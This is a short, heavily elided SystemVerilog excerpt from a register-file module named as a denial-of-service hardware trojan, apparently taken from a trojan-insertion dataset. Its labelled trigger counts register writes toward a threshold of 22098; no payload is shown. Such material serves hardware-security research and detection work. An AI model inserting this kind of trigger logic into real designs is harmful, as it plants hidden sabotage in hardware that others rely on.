...
module TestRegisterFile_trojan_DoS;
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=22098)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 22098;
    ...
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            ...
            if (intDstRegWE) trojan_counter <= trojan_counter + 1;
